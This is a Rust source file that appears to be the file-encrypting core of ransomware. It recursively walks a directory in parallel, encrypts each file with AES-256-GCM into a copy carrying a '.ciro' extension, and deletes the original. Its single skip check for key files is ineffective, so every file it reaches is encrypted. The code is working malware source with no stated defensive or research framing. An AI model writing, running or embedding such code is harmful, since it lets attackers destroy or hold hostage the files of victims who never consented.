use aes_gcm::{
    Aes256Gcm, aead::{AeadCore, OsRng, generic_array::GenericArray, stream::EncryptorBE32}
};
use rayon::prelude::*;
use std::{
    fs::{File, read_dir, remove_file},
    io::{BufReader, Read, Write},
    path::PathBuf,
};


fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let nonce_stream = GenericArray::from_slice(&nonce[0..8]); // Stream encryptor needs an 8-byte long nonce
    let mut encryptor = EncryptorBE32::from_aead(cipher, nonce_stream);

    let file = File::open(&path)?;
    // Using a bufreader to avoid loading the entire file in memory
    let mut reader = BufReader::new(file);
    let mut buffer = vec![0; 4096];

    let mut new_path = path.clone();
    if let Some(ext) = new_path.extension() {
        new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
    } else {
        new_path.set_extension("ciro");
    }
    let mut new_file = File::create(new_path)?;
    new_file.write_all(nonce_stream)?;

    loop {
        let bytes_read = reader.read(&mut buffer)?;
        if bytes_read == 0 {
            break;
        }

        let ciphertext = encryptor.encrypt_next(&buffer[0..bytes_read]).map_err(|_| std::io::Error::other("Encyption error"))?;

        new_file.write_all(&ciphertext)?;
    }

    let ciphertext_last = encryptor.encrypt_last(b"".as_ref()).map_err(|_| std::io::Error::other("Last encryption error"))?;
    new_file.write_all(&ciphertext_last)?;

    let _ = remove_file(path);

    Ok(())
}

pub fn encrypt_files(dir: PathBuf, cipher: Aes256Gcm) {
    if let Ok(entries) = read_dir(dir) {
        entries.par_bridge().into_par_iter().for_each(|entry| {
            if let Ok(entry) = entry {
                let path = entry.path();
                if path.is_dir() {
                    encrypt_files(path, cipher.clone());
                }
                else if let Some(ext) = path.extension() && ext != "txt.key"{
                    if let Some(err) = encrypt_file(path, cipher.clone()).err() {
                        println!("Error: {err}");
                    }
                } else if let Err(e) = encrypt_file(path, cipher.clone()) {
                    println!("Error: {e}");
                }
            }
        });
    }

}
